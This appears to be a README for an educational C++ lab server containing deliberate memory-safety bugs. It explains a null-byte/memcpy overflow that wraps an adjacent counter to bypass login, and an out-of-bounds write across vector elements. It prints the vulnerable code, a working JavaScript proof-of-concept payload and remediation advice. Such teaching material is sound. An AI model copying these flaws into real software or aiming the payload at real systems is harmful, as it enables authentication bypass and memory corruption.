# Buffer Overflow & Memory Safety Demonstration

An educational project demonstrating classic and modern memory corruption vulnerabilities in C++ web services. This repository showcases how subtle mismatches between C-style null-terminated strings (`strlen`, C-strings) and C++ binary-safe strings (`std::string`, `size()`) lead to critical buffer overflows, logic bypasses, and out-of-bounds writes.

---

## Table of Contents

- [Overview](#overview)
- [Repository Structure](#repository-structure)
- [Vulnerability Breakdown](#vulnerability-breakdown)
  - [Attack 1: Password Buffer Overflow & Logic Bypass](#attack-1-password-buffer-overflow--logic-bypass)
  - [Attack 2: Vector Contiguous Memory Corruption](#attack-2-vector-contiguous-memory-corruption)
- [Building & Running](#building--running)
  - [Compilation](#compilation)
  - [Compiling with AddressSanitizer (ASan)](#compiling-with-addresssanitizer-asan)
  - [Running the Server](#running-the-server)
- [Reproducing the Demonstrations](#reproducing-the-demonstrations)
- [Root Causes & Remediation](#root-causes--remediation)
- [Disclaimer](#disclaimer)

---

## Overview

Modern web applications written in native languages (C/C++) often bridge the gap between high-level abstractions (`std::string`, container classes) and low-level memory primitives (fixed-size buffers, `memcpy`, raw pointers).

This demonstration highlights two critical classes of memory safety bugs:
1. **Stack/Struct Variable Corruption:** Overwriting an adjacent state variable to manipulate program flow and bypass authentication logic.
2. **Contiguous Container Corruption:** Exploiting unchecked buffer copies inside objects residing in a contiguous container (`std::vector<User>`) to corrupt adjacent records.

---

## Repository Structure

```text
.
├── README.md                 # Project documentation and security analysis
└── bufferoverflow/
    ├── server.cpp            # Vulnerable HTTP server implementation (C++17)
    ├── httplib.h             # Header-only HTTP server library (cpp-httplib)
    ├── build.txt             # Compilation instructions for MSVC
    ├── democodes.txt         # JavaScript PoC attack payloads (browser console)
    ├── Attack_1.txt          # Technical deep-dive on Attack 1 (password struct corruption)
    ├── Attack_2.txt          # Technical deep-dive on Attack 2 (vector contiguous write)
    ├── server.exe            # Precompiled Windows executable
    └── server.obj            # Object build artifact
```

---

## Vulnerability Breakdown

### Attack 1: Password Buffer Overflow & Logic Bypass

* **Endpoint:** `POST /login`
* **Source:** [`server.cpp`](bufferoverflow/server.cpp)
* **Detailed Analysis:** [`Attack_1.txt`](bufferoverflow/Attack_1.txt)

#### The Vulnerable Code

```cpp
struct {
    char passwordcstr[32] = { 0 };
    unsigned int k = 0;
} temp;

std::memcpy(
    temp.passwordcstr,
    password.c_str(),
    password.size()
);

for (int i = 0; i < 32; i++) {
    if (user.password[i] != temp.passwordcstr[i])
        temp.k++;
}

if (temp.k == 0) {
    res.set_content(private_page(user), "text/html");
    return;
}
```

#### Mechanism

1. **Validation Mismatch:** The validation check uses `std::strlen(password.c_str()) >= sizeof(User::password)`. Because `strlen()` terminates at the first null byte (`\0`), placing an early `\0` in the password causes `strlen()` to return a small length, passing the validation check.
2. **Unchecked `memcpy`:** The server uses `password.size()` rather than `strlen()` for the copy length. `std::string` is binary-safe and tracks its full length regardless of embedded null bytes.
3. **Memory Layout:** `temp` is declared as a struct containing `char passwordcstr[32]` immediately followed by `unsigned int k`.
4. **Integer Arithmetic Wrap:** An attacker supplies 32 bytes of password prefix (with embedded `\0`), followed by 4 raw bytes: `0xE0, 0xFF, 0xFF, 0xFF` (representing `-32` in two's complement / `4,294,967,264`).
5. **The Bypass:** The comparison loop runs 32 times. On each mismatch, it increments `temp.k++`. Incrementing `4,294,967,264` by 32 results in integer overflow, wrapping `temp.k` back to exactly `0`. The server verifies `temp.k == 0` and grants access.

---

### Attack 2: Vector Contiguous Memory Corruption

* **Endpoint:** `POST /updateinfo`
* **Source:** [`server.cpp`](bufferoverflow/server.cpp)
* **Detailed Analysis:** [`Attack_2.txt`](bufferoverflow/Attack_2.txt)

#### The Vulnerable Code

```cpp
if (std::strcmp(user.password, password.c_str()) == 0) {
    std::memcpy(
        user.privateinfo,
        privateinfo.c_str(),
        privateinfo.size()
    );

    res.set_content(private_page(user), "text/html");
    return;
}
```

#### Mechanism

1. **Target Buffer:** `user.privateinfo` is defined with a fixed size of 256 bytes (`char privateinfo[256];`).
2. **Validation Flaw:** Length validation relies on `std::strlen(privateinfo.c_str()) >= sizeof(User::privateinfo)`.
3. **Out-of-Bounds Write:** When an attacker submits a payload with an early null byte followed by hundreds of additional bytes, `memcpy()` writes past `user.privateinfo[255]`.
4. **Impact on `std::vector<User>`:** Because `std::vector` allocates its elements contiguously, writing past the boundary of element $N$ corrupts the memory allocated for element $N+1$ (including its username, password, or private data).

---

## Building & Running

### Prerequisites

* Windows with MSVC (Visual Studio Build Tools or Visual Studio 2019/2022)
* Support for C++17

### Compilation

Open the **x64 Native Tools Command Prompt for VS** and run:

```cmd
cd bufferoverflow
cl /std:c++17 /EHsc /W3 server.cpp /Fe:server.exe
```

### Compiling with AddressSanitizer (ASan)

To observe memory corruption and out-of-bounds writes directly in your console/debugger:

```cmd
cl /std:c++17 /EHsc /W3 /fsanitize=address server.cpp /Fe:server.exe
```

### Running the Server

```cmd
server.exe
```

The server binds to `http://127.0.0.1:8080`.

---

## Reproducing the Demonstrations

The file [`democodes.txt`](bufferoverflow/democodes.txt) contains browser-ready JavaScript payloads using `Uint8Array` to preserve raw byte sequences without UTF-8 re-encoding.

### Executing Attack 1 (Authentication Bypass)

1. Navigate to `http://127.0.0.1:8080/register` in your browser.
2. Register an account with username `admin` and an arbitrary password.
3. Open Developer Tools (`F12`), switch to the **Console** tab, and execute the helper function and Attack 1 payload from [`democodes.txt`](bufferoverflow/democodes.txt):

```javascript
async function sendBytes(url, bytes) {
    return fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: bytes
    }).then(res => res.text()).then(html => {
        document.open();
        document.write(html);
        document.close();
    });
}

const passwordPrefix = "username=admin&password=x\0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
const passwordText = new TextEncoder().encode(passwordPrefix);
const passwordOverflow = new Uint8Array([0xE0, 0xFF, 0xFF, 0xFF]);

const passwordPayload = new Uint8Array(passwordText.length + passwordOverflow.length);
passwordPayload.set(passwordText);
passwordPayload.set(passwordOverflow, passwordText.length);

sendBytes("http://127.0.0.1:8080/login", passwordPayload);
```

4. The server validates the wrapped integer, logs in the user, and displays the authenticated private area without requiring the actual password.

---

## Root Causes & Remediation

| Issue | Vulnerable Pattern | Secure Remediation |
| :--- | :--- | :--- |
| **Length Semantic Mismatch** | Validating with `strlen(c_str())` while copying with `.size()` | Consistently use `size()` for validation and bounds checks. |
| **Unchecked Buffer Copy** | `std::memcpy(dest, src, src.size())` | Ensure `src.size() <= sizeof(dest)` or use safe copying abstractions. |
| **Fixed C-Style Buffers** | `char buffer[N];` | Use dynamic containers like `std::string` or `std::vector<char>` where appropriate. |
| **Insecure Comparison** | Custom loop with accumulator | Use constant-time comparison functions (e.g., `CRYPTO_memcmp`) and proper password hashing (e.g., Argon2, bcrypt). |

---

## Disclaimer

This codebase is provided solely for educational and research purposes to demonstrate memory safety concepts, compiler instrumentation, and secure coding practices. Do not use these techniques against systems without explicit authorization.
